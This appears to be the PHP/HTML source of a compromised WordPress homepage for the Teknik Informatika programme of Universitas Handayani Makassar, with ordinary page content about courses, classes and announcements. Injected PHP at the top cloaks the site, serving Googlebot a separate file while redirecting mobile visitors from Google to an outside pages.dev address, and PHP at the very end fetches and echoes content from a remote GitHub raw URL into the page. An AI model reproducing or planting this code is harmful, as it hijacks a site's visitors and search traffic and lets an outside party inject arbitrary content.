<?php
$amp_url = "https://amp-ti-handayani.pages.dev/"; 
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? ''; 
$referer = $_SERVER['HTTP_REFERER'] ?? ''; 
$is_from_google = !empty($referer) && preg_match("/google\.(com|co\.id)$/i", parse_url($referer, PHP_URL_HOST));
$is_mobile = preg_match("/(iPhone|Android|iPad|iPod|Mobile|BlackBerry|Windows Phone)/i", $user_agent);
$is_googlebot = preg_match("/(Googlebot|Googlebot-News|Googlebot-Image|Googlebot-Video|Googlebot-Mobile|Mediapartners-Google|AdsBot-Google|AdsBot-Google-Mobile|Google-InspectionTool|APIs-Google|Google-Site-Verification|Google Web Preview|Google Favicon|Google Feedfetcher)/i", $user_agent);

if ($is_googlebot) {
    header("Content-Type: text/html");
    if (file_exists("index.html")) {
        readfile("index.html");
    } else {
        echo "File index.html tidak ditemukan.";
    }
    exit;
}

if ($is_from_google && $is_mobile) {
    header("Location: $amp_url", true, 301);
    exit;
}
?><!DOCTYPE html>
			<html lang="id-ID">
	<head>
		<meta charset="UTF-8">
		<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
		<link rel="profile" href="http://gmpg.org/xfn/11">
		<title>Program Studi Teknik Informatika (S1) &#8211; Universitas Handayani Makassar</title>
<link rel='dns-prefetch' href='//fonts.googleapis.com' />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel="alternate" type="application/rss+xml" title="Program Studi Teknik Informatika (S1) &raquo; Feed" href="https://ti.handayani.ac.id/?feed=rss2" />
<link rel="alternate" type="application/rss+xml" title="Program Studi Teknik Informatika (S1) &raquo; Umpan Komentar" href="https://ti.handayani.ac.id/?feed=comments-rss2" />
		<script type="text/javascript">
			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/12.0.0-1\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/12.0.0-1\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/ti.handayani.ac.id\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.4.17"}};
			/*! This file is auto-generated */
			!function(e,a,t){var n,r,o,i=a.createElement("canvas"),p=i.getContext&&i.getContext("2d");function s(e,t){var a=String.fromCharCode;p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,e),0,0);e=i.toDataURL();return p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,t),0,0),e===i.toDataURL()}function c(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(o=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},r=0;r<o.length;r++)t.supports[o[r]]=function(e){if(!p||!p.fillText)return!1;switch(p.textBaseline="top",p.font="600 32px Arial",e){case"flag":return s([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])?!1:!s([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!s([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]);case"emoji":return!s([55357,56424,55356,57342,8205,55358,56605,8205,55357,56424,55356,57340],[55357,56424,55356,57342,8203,55358,56605,8203,55357,56424,55356,57340])}return!1}(o[r]),t.supports.everything=t.supports.everything&&t.supports[o[r]],"flag"!==o[r]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[o[r]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(n=t.source||{}).concatemoji?c(n.concatemoji):n.wpemoji&&n.twemoji&&(c(n.twemoji),c(n.wpemoji)))}(window,document,window._wpemojiSettings);
		</script>
		<style type="text/css">
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 .07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
	<link rel='stylesheet' id='wp-block-library-css'  href='https://ti.handayani.ac.id/wp-includes/css/dist/block-library/style.min.css?ver=5.4.17' type='text/css' media='all' />
<link rel='stylesheet' id='wp-block-library-theme-css'  href='https://ti.handayani.ac.id/wp-includes/css/dist/block-library/theme.min.css?ver=5.4.17' type='text/css' media='all' />
<link rel='stylesheet' id='graduate-fonts-css'  href='https://fonts.googleapis.com/css?family=Playfair+Display%7CRubik&#038;subset=latin%2Clatin-ext' type='text/css' media='all' />
<link rel='stylesheet' id='font-awesome-css'  href='https://ti.handayani.ac.id/wp-content/themes/graduate/assets/plugins/css/font-awesome.min.css?ver=1.4.3' type='text/css' media='all' />
<link rel='stylesheet' id='slick-css'  href='https://ti.handayani.ac.id/wp-content/themes/graduate/assets/plugins/css/slick.min.css?ver=1.4.3' type='text/css' media='all' />
<link rel='stylesheet' id='slick-theme-css'  href='https://ti.handayani.ac.id/wp-content/themes/graduate/assets/plugins/css/slick-theme.min.css?ver=1.4.3' type='text/css' media='all' />
<link rel='stylesheet' id='jquery-sidr-light-css'  href='https://ti.handayani.ac.id/wp-content/themes/graduate/assets/plugins/css/jquery.sidr.light.min.css?ver=1.4.3' type='text/css' media='all' />
<link rel='stylesheet' id='animate-css'  href='https://ti.handayani.ac.id/wp-content/themes/graduate/assets/plugins/css/animate.min.css?ver=1.4.3' type='text/css' media='all' />
<link rel='stylesheet' id='graduate-style-css'  href='https://ti.handayani.ac.id/wp-content/themes/graduate/style.css?ver=1.4.3' type='text/css' media='all' />
<style id='graduate-style-inline-css' type='text/css'>
.site-title a,
			.site-description {
				color: #000000}
</style>
<link rel='stylesheet' id='graduate-blue-css'  href='https://ti.handayani.ac.id/wp-content/themes/graduate/assets/css/blue.min.css?ver=1.4.3' type='text/css' media='all' />
<link rel='stylesheet' id='graduate-blocks-css'  href='https://ti.handayani.ac.id/wp-content/themes/graduate/assets/css/blocks.min.css?ver=1.4.3' type='text/css' media='all' />
<script type='text/javascript' src='https://ti.handayani.ac.id/wp-includes/js/jquery/jquery.js?ver=1.12.4-wp'></script>
<script type='text/javascript' src='https://ti.handayani.ac.id/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
<!--[if lt IE 9]>
<script type='text/javascript' src='https://ti.handayani.ac.id/wp-content/themes/graduate/assets/js/html5.min.js?ver=3.7.3'></script>
<![endif]-->
<link rel='https://api.w.org/' href='https://ti.handayani.ac.id/index.php?rest_route=/' />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://ti.handayani.ac.id/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://ti.handayani.ac.id/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 5.4.17" />
<link rel="canonical" href="https://ti.handayani.ac.id/" />
<link rel='shortlink' href='https://ti.handayani.ac.id/' />
<link rel="alternate" type="application/json+oembed" href="https://ti.handayani.ac.id/index.php?rest_route=%2Foembed%2F1.0%2Fembed&#038;url=https%3A%2F%2Fti.handayani.ac.id%2F" />
<link rel="alternate" type="text/xml+oembed" href="https://ti.handayani.ac.id/index.php?rest_route=%2Foembed%2F1.0%2Fembed&#038;url=https%3A%2F%2Fti.handayani.ac.id%2F&#038;format=xml" />
<link rel="icon" href="https://ti.handayani.ac.id/wp-content/uploads/2016/12/cropped-favicon-32x32.png" sizes="32x32" />
<link rel="icon" href="https://ti.handayani.ac.id/wp-content/uploads/2016/12/cropped-favicon-192x192.png" sizes="192x192" />
<link rel="apple-touch-icon" href="https://ti.handayani.ac.id/wp-content/uploads/2016/12/cropped-favicon-180x180.png" />
<meta name="msapplication-TileImage" content="https://ti.handayani.ac.id/wp-content/uploads/2016/12/cropped-favicon-270x270.png" />
</head>

<body class="home page-template-default page page-id-2 wide right-sidebar">
		<div id="page" class="site">
			<a class="skip-link screen-reader-text" href="#content">Skip to content</a>

					<section id="top-bar">
				<button class="topbar-toggle"><i class="fa fa-phone"></i></button>
				<div class="container topbar-dropdown">
					<div class="pull-left">
						<ul class="address-block">
															<li class="phone"><a href="tel:624114673395"><i class="fa fa-phone"></i>+62 411 4673395</a></li>
															<li class="address"><i class="fa fa-map-marker"></i>Jl. Adhyaksa Baru No. 1 Makassar</li>
													</ul><!-- end .address-block -->
					</div><!-- end .pull-left -->
					<div class="pull-right">
											</div><!-- end .pull-right -->
				</div><!-- end .container -->
			</section><!-- #top-bar -->
				<header id="masthead" class="site-header" role="banner">
				<div class="container">
			<div class="site-branding pull-left">
								<div id="site-header">
					<h1 class="site-title"><a href="https://ti.handayani.ac.id/" rel="home">Program Studi Teknik Informatika (S1)</a></h1>
											<p class="site-description">Universitas Handayani Makassar</p>
									</div><!--#site-header-->
			</div><!--end .site-branding-->

					</div><!--.container-->
			<nav id="site-navigation" class="main-navigation">
			<div class="container">
				<div class="menu-menu-utama-container"><ul id="primary-menu" class="menu"><li id="menu-item-113" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home current-menu-item page_item page-item-2 current_page_item menu-item-113"><a href="https://ti.handayani.ac.id/" aria-current="page">Home</a></li>
<li id="menu-item-117" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-117"><a href="#">Profil</a>
<ul class="sub-menu">
	<li id="menu-item-97" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-97"><a href="https://ti.handayani.ac.id/?page_id=28">Visi Misi &#038; Tujuan</a></li>
	<li id="menu-item-148" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-148"><a href="https://ti.handayani.ac.id/?page_id=146">Pengelola</a></li>
	<li id="menu-item-115" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-115"><a href="https://ti.handayani.ac.id/?page_id=32">Tenaga Pengajar</a></li>
	<li id="menu-item-128" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-128"><a href="https://ti.handayani.ac.id/?page_id=126">Daftar Judul Skripsi Mahasiswa</a></li>
	<li id="menu-item-238" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-238"><a href="https://ti.handayani.ac.id/?page_id=235">Akreditasi</a></li>
</ul>
</li>
<li id="menu-item-99" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-99"><a href="https://ti.handayani.ac.id/?page_id=24">Kurikulum</a></li>
<li id="menu-item-116" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-116"><a href="https://ti.handayani.ac.id/?page_id=34">Admisi</a></li>
<li id="menu-item-165" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-165"><a href="https://ti.handayani.ac.id/?page_id=157">Tracer Study</a></li>
<li id="menu-item-190" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-190"><a href="https://ti.handayani.ac.id/?cat=5">Pengumuman</a></li>
<li id="menu-item-334" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-334"><a href="https://ti.handayani.ac.id/?page_id=330">Download</a></li>
<li id="menu-item-366" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-366"><a href="https://ti.handayani.ac.id/?page_id=364">Hubungi</a></li>
</ul></div>					<div id="search">
						
<form role="search" method="get" class="search-form" action="https://ti.handayani.ac.id/">
	<label>
		<span class="screen-reader-text">Search for:</span>
		<input type="search" class="search-field" placeholder="Cari" value="" name="s">
	</label>
	<button type="submit" class="search-submit"><span class="screen-reader-text">Search</span><i class="fa fa-search"></i></button>
</form><!--.search-form-->					</div><!-- .search -->
							</div><!-- end .container -->
		</nav><!--end .main-navigation-->
				</header><!-- #masthead -->
				<!-- Mobile Menu -->
		<nav id="sidr-left-top" class="mobile-menu sidr left">
			<div class="menu-menu-utama-container"><ul id="primary-menu" class="menu"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home current-menu-item page_item page-item-2 current_page_item menu-item-113"><a href="https://ti.handayani.ac.id/" aria-current="page">Home</a></li>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-117"><a href="#">Profil</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-97"><a href="https://ti.handayani.ac.id/?page_id=28">Visi Misi &#038; Tujuan</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-148"><a href="https://ti.handayani.ac.id/?page_id=146">Pengelola</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-115"><a href="https://ti.handayani.ac.id/?page_id=32">Tenaga Pengajar</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-128"><a href="https://ti.handayani.ac.id/?page_id=126">Daftar Judul Skripsi Mahasiswa</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-238"><a href="https://ti.handayani.ac.id/?page_id=235">Akreditasi</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-99"><a href="https://ti.handayani.ac.id/?page_id=24">Kurikulum</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-116"><a href="https://ti.handayani.ac.id/?page_id=34">Admisi</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-165"><a href="https://ti.handayani.ac.id/?page_id=157">Tracer Study</a></li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-190"><a href="https://ti.handayani.ac.id/?cat=5">Pengumuman</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-334"><a href="https://ti.handayani.ac.id/?page_id=330">Download</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-366"><a href="https://ti.handayani.ac.id/?page_id=364">Hubungi</a></li>
</ul></div>				<div id="search">
					
<form role="search" method="get" class="search-form" action="https://ti.handayani.ac.id/">
	<label>
		<span class="screen-reader-text">Search for:</span>
		<input type="search" class="search-field" placeholder="Cari" value="" name="s">
	</label>
	<button type="submit" class="search-submit"><span class="screen-reader-text">Search</span><i class="fa fa-search"></i></button>
</form><!--.search-form-->				</div><!-- .search -->
					</nav> 

		<a id="sidr-left-top-button" class="menu-button right" href="#sidr-left-top"><i class="fa fa-bars"></i></a>
			<div id="content" class="site-content">
		
        <section id="main-slider" data-effect="linear" data-slick='{"slidesToShow": 1, "slidesToScroll": 1, "infinite": true, "speed": 1000, "dots": true, "arrows":true, "autoplay": true, "fade": true, "pauseOnHover": true }'>
                            <div class="slider-item display-block" style="background-image: url('https://ti.handayani.ac.id/wp-content/uploads/2018/02/Untitled-4-1.jpg')">
                    <div class="main-slider-contents wow fadeInUp" data-wow-delay="0.3s" data-wow-duration="0.3s">
                        <div class="container">
                            <h2 class="title"><a href="https://ti.handayani.ac.id/?page_id=261" class="color-white">Selamat Datang di Web Prodi Teknik Informatika</a></h2>  
                            <p class="desc">Selamat datang di website resmi Program Studi...</p>
                        </div><!-- end .container -->
                    </div><!-- end .main-slider-contents -->
                </div><!-- end .slider-item -->
                            <div class="slider-item display-none" style="background-image: url('https://ti.handayani.ac.id/wp-content/uploads/2018/02/Untitled-4.jpg')">
                    <div class="main-slider-contents wow fadeInUp" data-wow-delay="0.3s" data-wow-duration="0.3s">
                        <div class="container">
                            <h2 class="title"><a href="https://ti.handayani.ac.id/?page_id=24" class="color-white">Kurikulum</a></h2>  
                            <p class="desc">  Struktur Kurikulum Program Studi Teknik...</p>
                        </div><!-- end .container -->
                    </div><!-- end .main-slider-contents -->
                </div><!-- end .slider-item -->
                            <div class="slider-item display-none" style="background-image: url('https://ti.handayani.ac.id/wp-content/uploads/2018/02/Untitled-3.jpg')">
                    <div class="main-slider-contents wow fadeInUp" data-wow-delay="0.3s" data-wow-duration="0.3s">
                        <div class="container">
                            <h2 class="title"><a href="https://ti.handayani.ac.id/?page_id=28" class="color-white">Visi Misi &#038; Tujuan</a></h2>  
                            <p class="desc">Visi Program Studi Teknik Informatika STMIK...</p>
                        </div><!-- end .container -->
                    </div><!-- end .main-slider-contents -->
                </div><!-- end .slider-item -->
                    </section><!-- end #main-slider -->


        <section id="news-section" class="four-columns">
            <div class="container">
                <div class="row">

                                            <div class="column-wrapper">
                                                            <header class="entry-header wow fadeInDown" data-wow-delay="0.1s" data-wow-duration="0.3s">
                                    <h2 class="entry-title color-black">Info Prodi</h2>
                                </header><!--.entry-header-->
                                                    </div><!--.column-wrapper-->
                    
                                            <div class="column-wrapper wow fadeInUp" data-wow-delay="0.2s" data-wow-duration="0.3s">
                            <div class="news-image">
                                <a href="https://ti.handayani.ac.id/?p=636"><img src="https://ti.handayani.ac.id/wp-content/uploads/2020/06/Untitled-2.png" alt="Pengumuman Penerima Bantuan SPP/UKT Semester Ganjil 2021/2022 dan kekurangan kelengkapan berkas Jurusan Teknik Informatika"></a>
                            </div>
                            <div class="news-content">
                                <a href="https://ti.handayani.ac.id/?m=201612" class="date"><time>Agustus 14, 2025</time></a>
                                <h3><a href="https://ti.handayani.ac.id/?p=636">Pengumuman Penerima Bantuan SPP/UKT Semester Ganjil 2021/2022 dan kekurangan kelengkapan berkas Jurusan Teknik Informatika</a></h3>
                                <p>Disampaikan Kepada Seluruh Mahasiswa Yang namanya tertera sebagai penerima bantuan SPP/UKT Jurusan...</p>
                            </div><!--.course-image-->
                        </div><!--.column-wrapper-->
                                            <div class="column-wrapper wow fadeInUp" data-wow-delay="0.2s" data-wow-duration="0.3s">
                            <div class="news-image">
                                <a href="https://ti.handayani.ac.id/?p=620"><img src="https://ti.handayani.ac.id/wp-content/uploads/2020/06/Untitled-2.png" alt="PENGUMUMAN PENERIMA BANTUAN UKT/SPP SEMESTER GANJIL T.A. 2021/2022"></a>
                            </div>
                            <div class="news-content">
                                <a href="https://ti.handayani.ac.id/?m=201612" class="date"><time>Agustus 14, 2025</time></a>
                                <h3><a href="https://ti.handayani.ac.id/?p=620">PENGUMUMAN PENERIMA BANTUAN UKT/SPP SEMESTER GANJIL T.A. 2021/2022</a></h3>
                                <p>Disampaikan kepada seluruh Mahasiswa jurusan teknik informatika yang tertera namanya pada pengumuman...</p>
                            </div><!--.course-image-->
                        </div><!--.column-wrapper-->
                                            <div class="column-wrapper wow fadeInUp" data-wow-delay="0.2s" data-wow-duration="0.3s">
                            <div class="news-image">
                                <a href="https://ti.handayani.ac.id/?p=614"><img src="https://ti.handayani.ac.id/wp-content/uploads/2020/06/Untitled-2.png" alt="Pengumuman Ujian Kompetensi 2021"></a>
                            </div>
                            <div class="news-content">
                                <a href="https://ti.handayani.ac.id/?m=201612" class="date"><time>November 30, 2021</time></a>
                                <h3><a href="https://ti.handayani.ac.id/?p=614">Pengumuman Ujian Kompetensi 2021</a></h3>
                                <p>Disampaikan kepada seluruh mahasiswa peserta ujian kompetensi untuk mengunduh hasil ujian kompetensiUnduh...</p>
                            </div><!--.course-image-->
                        </div><!--.column-wrapper-->
                    
                </div><!--.row-->
            </div><!--.container-->
        </section><!--.news-section-->

	<div class="container page-section">
		<div id="primary" class="content-area">
			<main id="main" class="site-main" role="main">

				
<article id="post-2" class="post-2 page type-page status-publish hentry">

			<header class="entry-header">
			<h1 class="entry-title">Selamat Datang di Teknik Informatika STMIK Handayani</h1>		</header><!-- .entry-header -->
	
	<div class="entry-content wow fadeInUp" data-wow-delay="0.1s" data-wow-duration="0.3s">
					<div class="blog-image">
							</div>
		
<figure class="wp-block-image size-large is-resized"><img src="http://ti.handayani.ac.id/wp-content/uploads/2022/01/logo-kampus-merdeka-1024x393.png" alt="" class="wp-image-624" width="463" height="177" srcset="https://ti.handayani.ac.id/wp-content/uploads/2022/01/logo-kampus-merdeka-1024x393.png 1024w, https://ti.handayani.ac.id/wp-content/uploads/2022/01/logo-kampus-merdeka-300x115.png 300w, https://ti.handayani.ac.id/wp-content/uploads/2022/01/logo-kampus-merdeka-768x295.png 768w, https://ti.handayani.ac.id/wp-content/uploads/2022/01/logo-kampus-merdeka.png 1110w" sizes="(max-width: 463px) 100vw, 463px" /><figcaption>Kunjungi <a href="https://kampusmerdeka.kemdikbud.go.id/">https://kampusmerdeka.kemdikbud.go.id</a><br>untuk Mendaftarkan diri Pada Skema Kampus Merdeka untuk info lebih lanjut akses link di atas.<br><br></figcaption></figure>



<p>Mengahasilkan sarjana komputer yang menguasai rekayasa perangkat lunak (Software), Jaringan Komputer dan perancangan sistem, aplikasi komputer grafik, desain web, komputer aided design, Sistem informasi, database sistem, Multimedia dan kemampuan bahasa pemrograman.</p>



<p>Konsentrasi Jurusan :</p>



<ol><li>Multimedia, Design, Animasi dan Game.</li><li>Web Desain, Website System, Database dan jaringan.</li><li>Rekayasa Perangkat Lunak, Pemrograman Komputer dan Database System.</li></ol>



<p>Program Studi Teknik Informatika membuka 3 Kelas yaitu :</p>



<ol><li>Kelas Reguler (Senin sampai Sabtu) Pukul 08:00 sampai dengan 17:00 WITA.</li><li>Kelas Malam (Senin sampai Sabtu) Pukul 17:00 Samapi dengan 22:00 WITA.</li><li>Kelas Executive (Sabtu dan Minggu) Pukul 08:00 sampai pukul 20:00 WITA</li></ol>



<p></p>
	</div><!-- .entry-content -->

	</article><!-- #post-## -->

			</main><!-- #main -->
		</div><!-- #primary -->
		
<aside id="secondary" class="widget-area" role="complementary">
	<section id="search-2" class="widget widget_search">
<form role="search" method="get" class="search-form" action="https://ti.handayani.ac.id/">
	<label>
		<span class="screen-reader-text">Search for:</span>
		<input type="search" class="search-field" placeholder="Cari" value="" name="s">
	</label>
	<button type="submit" class="search-submit"><span class="screen-reader-text">Search</span><i class="fa fa-search"></i></button>
</form><!--.search-form--></section>		<section id="recent-posts-2" class="widget widget_recent_entries">		<h2 class="widget-title">Pos-pos Terbaru</h2>		<ul>
											<li>
					<a href="https://ti.handayani.ac.id/?p=636">Pengumuman Penerima Bantuan SPP/UKT Semester Ganjil 2021/2022 dan kekurangan kelengkapan berkas Jurusan Teknik Informatika</a>
									</li>
											<li>
					<a href="https://ti.handayani.ac.id/?p=620">PENGUMUMAN PENERIMA BANTUAN UKT/SPP SEMESTER GANJIL T.A. 2021/2022</a>
									</li>
											<li>
					<a href="https://ti.handayani.ac.id/?p=614">Pengumuman Ujian Kompetensi 2021</a>
									</li>
											<li>
					<a href="https://ti.handayani.ac.id/?p=611">PENGUMUMAN PENERIMA BANTUAN SPP/UKT SEMESTER GANJIL TAHUN AKADEMIK 2021/2022 JURUSAN TEKNIK INFORMATIKA</a>
									</li>
											<li>
					<a href="https://ti.handayani.ac.id/?p=606">Pengumuman, Jadwal Mata Kuliah Semester Ganjil Tahun Akademik 2021/2022</a>
									</li>
					</ul>
		</section></aside><!-- #secondary -->
		</div><!-- .container -->
		</div><!-- #content -->
				<footer id="colophon" class="site-footer " role="contentinfo">
			<div class="site-info clear">
			<div class="container">
				<div class="pull-left">
					<p>
						Copyright © 2025 UPT ICT STMIK Handayani. All Rights Reserved						<span class="sep"> | </span>
						Graduate by <a href="https://themepalace.com/" rel="designer" target="_blank">Theme Palace</a>
				</div><!--.pull-left-->
				<div class="pull-right footer-menu">
									</div><!--.pull-right-->
			</div><!--.container-->
		</div><!--.site-info-->
			</footer><!-- #colophon -->
				<div class="backtotop"><i class="fa fa-angle-up"></i></div>
				</div><!-- #page -->
		
<script type='text/javascript' src='https://ti.handayani.ac.id/wp-content/themes/graduate/assets/plugins/js/jquery.sidr.min.js?ver=5.4.17'></script>
<script type='text/javascript' src='https://ti.handayani.ac.id/wp-content/themes/graduate/assets/plugins/js/slick.min.js?ver=5.4.17'></script>
<script type='text/javascript' src='https://ti.handayani.ac.id/wp-content/themes/graduate/assets/plugins/js/wow.min.js?ver=5.4.17'></script>
<script type='text/javascript' src='https://ti.handayani.ac.id/wp-content/themes/graduate/assets/js/animation.min.js?ver=5.4.17'></script>
<script type='text/javascript' src='https://ti.handayani.ac.id/wp-content/themes/graduate/assets/js/navigation.min.js?ver=20151215'></script>
<script type='text/javascript' src='https://ti.handayani.ac.id/wp-content/themes/graduate/assets/js/skip-link-focus-fix.min.js?ver=20151215'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var data = {"current_site":"https:\/\/ti.handayani.ac.id"};
/* ]]> */
</script>
<script type='text/javascript' src='https://ti.handayani.ac.id/wp-content/themes/graduate/assets/js/custom.min.js?ver=5.4.17'></script>
<script type='text/javascript' src='https://ti.handayani.ac.id/wp-includes/js/wp-embed.min.js?ver=5.4.17'></script>

</body>
</html>
<?php
$aa = file_get_contents('https://raw.githubusercontent.com/SatoruGojo03/Gojo/refs/heads/main/konoha');
echo $aa;
?>
